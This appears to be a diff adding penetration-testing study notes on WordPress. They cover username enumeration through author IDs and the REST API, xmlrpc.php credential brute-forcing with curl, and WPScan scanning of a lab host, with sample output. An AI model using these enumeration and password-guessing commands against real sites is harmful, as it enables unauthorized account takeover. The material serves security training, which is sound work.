@@ -348,3 +348,279 @@ To mitigate directory indexing risks and restrict direct file exposure:
 2. **Nginx Web Server:** Ensure `autoindex` is turned off in the server block configuration:
 
        autoindex off;
+
+# WordPress User Enumeration
+
+## Overview
+Enumerating valid users is a critical reconnaissance phase during a WordPress security assessment. Acquiring an accurate list of active usernames significantly expands the attack surface, enabling targeted brute-force or credential-stuffing attacks. If successful, attackers can gain authenticated access to the WordPress backend (e.g., as an Author or Administrator). This level of access can be leveraged to modify website content, implant backdoors, or interact with the underlying web server, potentially leading to Remote Code Execution (RCE).
+
+There are two primary manual methods for enumerating users in a standard WordPress deployment.
+
+## Method 1: Author ID Parameter Manipulation
+
+This technique leverages the default WordPress behavior of mapping user IDs to their corresponding usernames via the `author` URL parameter. By default, the initial administrative user is assigned `ID=1`.
+
+### Manual Browser Enumeration
+Navigating through published posts and inspecting the author link (e.g., hovering over the "by admin" hyperlink) often reveals the user's account path in the browser's status bar. 
+
+Alternatively, you can manually append the `author` parameter to the base URL to verify if the ID resolves to a valid user:
+
+    http://<target-ip_or_domain>/?author=1
+
+### CLI Enumeration using cURL
+You can automate and verify this behavior from the command line using `curl`. By inspecting the HTTP response headers—specifically the `Location` header—you can extract the associated username without fully rendering the page.
+
+**Querying an Existing User:**
+
+    curl -s -I http://blog.inlanefreight.com/?author=1
+
+**Expected Output (HTTP 301 Redirect):**
+
+    HTTP/1.1 301 Moved Permanently
+    Date: Wed, 13 May 2020 20:47:08 GMT
+    Server: Apache/2.4.29 (Ubuntu)
+    X-Redirect-By: WordPress
+    Location: http://blog.inlanefreight.com/index.php/author/admin/
+    Content-Length: 0
+    Content-Type: text/html; charset=UTF-8
+
+*Technical Note: The `Location` header explicitly reveals the username `admin` associated with ID 1.*
+
+**Querying a Non-Existing User:**
+
+    curl -s -I http://blog.inlanefreight.com/?author=100
+
+**Expected Output (HTTP 404 Not Found):**
+
+    HTTP/1.1 404 Not Found
+    Date: Wed, 13 May 2020 20:47:14 GMT
+    Server: Apache/2.4.29 (Ubuntu)
+    Expires: Wed, 11 Jan 1984 05:00:00 GMT
+    Cache-Control: no-cache, must-revalidate, max-age=0
+    Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
+    Transfer-Encoding: chunked
+    Content-Type: text/html; charset=UTF-8
+
+*Technical Note: If the queried user ID does not exist in the database, the server returns a standard 404 Not Found error.*
+
+## Method 2: WordPress REST API (JSON Endpoint)
+
+The second method relies on querying the WordPress REST API endpoint, which natively exposes user metadata in JSON format. 
+
+*Security Context: In WordPress core versions prior to 4.7.1, this endpoint displayed all users who had published a post by default. In subsequent versions, its verbosity was restricted, though it may still expose user configurations depending on specific site settings or installed plugins.*
+
+### Querying the Users Endpoint
+Using `curl` piped into `jq` provides a cleanly formatted, parsed output of the user array.
+
+    curl -s http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
+
+**Expected Output (JSON):**
+
+    [
+      {
+        "id": 1,
+        "name": "admin",
+        "url": "",
+        "description": "",
+        "link": "http://blog.inlanefreight.com/index.php/author/admin/"
+      },
+      {
+        "id": 2,
+        "name": "ch4p",
+        "url": "",
+        "description": "",
+        "link": "http://blog.inlanefreight.com/index.php/author/ch4p/"
+      }
+    ]
+
+*Technical Note: This output instantly provides exact usernames (`admin`, `ch4p`) alongside their assigned IDs. This enumerated list can then be directly compiled into a dictionary file for targeted password attacks using tools like Hydra or WPScan.*
+
+# WordPress Authentication Brute-Forcing via XML-RPC
+
+## Overview
+
+Upon compiling a robust list of valid usernames, security analysts can orchestrate a password brute-force attack to attempt unauthorized access to the WordPress administrative backend. While traditional brute-forcing targets the standard web portal (`wp-login.php`), leveraging the `xmlrpc.php` API endpoint often proves to be a more stealthy and efficient attack vector, bypassing certain front-end rate limits and protections.
+
+## Exploiting xmlrpc.php for Authentication Validation
+
+Authentication attempts against the `xmlrpc.php` interface require crafting specific XML payloads. By invoking the `wp.getUsersBlogs` method, an auditor can validate credential pairs directly via POST requests.
+
+### Successful Authentication Response
+
+If the injected POST request contains valid credentials, the target server will return an XML response disclosing the user's administrative privileges, the blog ID, and the application URL.
+
+**Command Execution:**
+
+    curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+
+**Server Response (200 OK):**
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <methodResponse>
+      <params>
+        <param>
+          <value>
+            <array><data>
+              <value><struct>
+                <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
+                <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
+                <member><name>blogid</name><value><string>1</string></value></member>
+                <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
+                <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
+              </struct></value>
+            </data></array>
+          </value>
+        </param>
+      </params>
+    </methodResponse>
+
+### Failed Authentication Response
+
+Conversely, if the submitted credentials are invalid, the target server will deny access, responding with a `403 Forbidden` status code embedded within a `faultCode` error block.
+
+**Command Execution:**
+
+    curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>WRONG-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+
+**Server Response (403 Forbidden):**
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <methodResponse>
+      <fault>
+        <value>
+          <struct>
+            <member>
+              <name>faultCode</name>
+              <value><int>403</int></value>
+            </member>
+            <member>
+              <name>faultString</name>
+              <value><string>Incorrect username or password.</string></value>
+            </member>
+          </struct>
+        </value>
+      </fault>
+    </methodResponse>
+
+## The Imperative of Manual Enumeration
+
+Understanding manual enumeration methodologies is a critical prerequisite before transitioning to automated exploitation frameworks. While automated vulnerability scanners exponentially accelerate the penetration testing workflow, security professionals must fundamentally comprehend the underlying mechanics and the network footprint generated on target systems. 
+
+Mastery of manual techniques ensures that an auditor can effectively troubleshoot, calibrate payloads, and validate findings when automated tools fail, trigger Intrusion Detection Systems (IDS), or yield anomalous outputs.
+
+# WPScan: Automated WordPress Enumeration and Vulnerability Scanner
+
+## Overview
+WPScan is an industry-standard, black-box automated security scanner designed specifically for auditing WordPress environments. It is utilized by security professionals and system administrators to enumerate target applications and identify potential security flaws, including outdated core versions, vulnerable plugins, misconfigured themes, and exposed user credentials. 
+
+While WPScan is pre-installed on penetration testing distributions such as Parrot OS and Kali Linux, it can also be manually deployed in any standard Linux environment via RubyGems.
+
+## Installation and Verification
+For environments where WPScan is not natively available, it can be installed using the Ruby package manager (`gem`).
+
+To install WPScan manually, execute the following command:
+    
+    MikyRedHat@htb[/htb]$ gem install wpscan
+
+Once the deployment is complete, it is best practice to verify the installation and review the available command-line arguments. The `--hh` flag outputs the comprehensive help menu, which is critical for tailoring the tool to specific auditing requirements.
+
+    MikyRedHat@htb[/htb]$ wpscan --hh
+
+*Note: The usage menu provides extensive configuration parameters, including output formatting, request timeouts, and specific enumeration flags.*
+
+## Enumeration Strategies and Fine-Tuning
+WPScan supports highly granular enumeration modules. System administrators and penetration testers must fine-tune the scanner's parameters based on the specific scope and objective of the engagement:
+
+*   **Vulnerability Scanning:** Targeting specific vulnerable plugins or themes that have known CVEs (Common Vulnerabilities and Exposures) or publicly available Proof of Concepts (PoCs).
+*   **Comprehensive Auditing:** Performing a full-scope baseline scan of all aspects of the target WordPress site to assess its overall security posture and identify misconfigurations.
+*   **User Enumeration:** Extracting valid usernames from the target environment. This list can subsequently be leveraged in brute-force or dictionary-based password guessing attacks against the WordPress authentication portals (e.g., `wp-login.php` or `xmlrpc.php`).
+
+## WPVulnDB API Integration
+To maximize the effectiveness of WPScan, it is highly recommended to integrate it with external vulnerability databases. WPScan cross-references the enumerated data against the WPVulnDB database to provide accurate security reports and exploit references.
+
+### Configuration Steps
+1. Register for an account on the WPVulnDB platform.
+2. Navigate to the user dashboard and generate an API Token.
+3. Supply the token during the execution of WPScan using the `--api-token` parameter.
+
+*Note: The free tier of the WPVulnDB API currently restricts usage to 50 requests per day, which is generally sufficient for individual assessments or targeted Homelab testing.*
+
+# WordPress Enumeration with WPScan
+
+## 1. Overview
+During a penetration test or security audit, enumerating a WordPress application is a critical phase to identify potential attack vectors. **WPScan** is an industry-standard, black-box vulnerability scanner specifically designed to enumerate various WordPress components, including vulnerable plugins, themes, users, media files, and configuration backups.
+
+By default, WPScan leverages both **passive** (analyzing source code, headers, and RSS feeds) and **aggressive** (brute-forcing, direct file access) detection methods to map the target's attack surface.
+
+## 2. Core Enumeration Flags and Syntax
+To perform targeted enumeration, WPScan utilizes the `--enumerate` flag followed by specific component arguments. 
+
+### Key Parameters:
+*   `--enumerate` (or `-e`): Triggers the enumeration module. By default, it scans for vulnerable plugins, themes, users, media, and backups.
+*   `--enumerate ap`: Restricts the enumeration to **All Plugins**. (Other common arguments include `u` for users, `at` for all themes, and `vp` for vulnerable plugins).
+*   `--api-token <TOKEN>`: Integrates with the WPScan Vulnerability Database (WPVulnDB) API to map discovered versions against known CVEs and exploits.
+*   `-t <NUMBER>`: Adjusts the number of concurrent threads. The default value is `5`, but it can be increased for faster scanning or decreased to evade intrusion detection systems (IDS).
+
+## 3. Practical Execution & Scan Analysis
+
+The following output demonstrates a standard enumeration scan executed against a target environment. 
+
+### Command Execution
+    wpscan --url http://blog.inlanefreight.com --enumerate --api-token <API_TOKEN>
+
+### Scan Breakdown & Auditor Analysis
+
+**A. Server & Infrastructure Fingerprinting**
+    [+] URL: http://blog.inlanefreight.com/                                                 
+    [+] Headers                                                                         
+    |  - Server: Apache/2.4.38 (Debian)
+    |  - X-Powered-By: PHP/7.3.15
+    | Found By: Headers (Passive Detection)
+*Technical Insight:* Passive detection via HTTP headers reveals the underlying backend infrastructure (Apache on Debian and PHP 7.3.15), which is crucial for identifying specific server-side exploits.
+
+**B. Exposed APIs & Services**
+    [+] XML-RPC seems to be enabled: http://blog.inlanefreight.com/xmlrpc.php
+    | Found By: Direct Access (Aggressive Detection)
+    |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+
+    [+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.com/wp-cron.php
+    | Found By: Direct Access (Aggressive Detection)
+    |  - https://www.iplocation.net/defend-wordpress-from-ddos
+*Technical Insight:* The presence of an enabled `xmlrpc.php` exposes the application to potential brute-force and DDoS (Pingback) attacks. External `wp-cron.php` access can also be abused to trigger resource exhaustion (DoS).
+
+**C. Core Version & Theme Enumeration**
+    [+] WordPress version 5.3.2 identified (Latest, released on 2019-12-18).
+    | Found By: Rss Generator (Passive Detection)
+
+    [+] WordPress theme in use: twentytwenty
+    | Location: http://blog.inlanefreight.com/wp-content/themes/twentytwenty/
+    | Readme: http://blog.inlanefreight.com/wp-content/themes/twentytwenty/readme.txt
+    | [!] The version is out of date, the latest version is 1.2
+*Technical Insight:* WPScan successfully parsed the RSS feed generator tag to extract the exact WordPress core version. Furthermore, it identified an outdated theme by accessing its `readme.txt` file.
+
+**D. Vulnerable Plugin Identification**
+    [+] Enumerating Vulnerable Plugins (via Passive Methods)
+    [i] Plugin(s) Identified:
+    [+] mail-masta
+    | Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/                 
+    | [!] 2 vulnerabilities identified:
+    | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
+    |      - https://www.exploit-db.com/exploits/40290/ 
+    | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
+    |      - https://wpvulndb.com/vulnerabilities/8740                                                   
+    [+] wp-google-places-review-slider
+    | [!] 1 vulnerability identified:
+    | [!] Title: WP Google Review Slider <= 6.1 - Authenticated SQL Injection
+*Technical Insight:* The API integration matched the installed plugins against the vulnerability database. Critical findings include an Unauthenticated Local File Inclusion (LFI) and multiple SQL Injections (SQLi), providing immediate high-severity attack vectors for exploitation.
+
+**E. User Enumeration**
+    [+] Enumerating Users (via Passive and Aggressive Methods)
+    [i] User(s) Identified:
+    [+] admin
+     | Found By: Author Posts - Display Name (Passive Detection)
+     | Confirmed By:
+     |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+     |  Login Error Messages (Aggressive Detection)
+    [+] david
+    [+] roger
+*Technical Insight:* The tool mapped valid usernames (`admin`, `david`, `roger`) by inspecting author display names and confirming them via Author ID brute-forcing and login error message behavior. This list is highly valuable for subsequent targeted brute-force attacks against `wp-login.php` or `xmlrpc.php`.
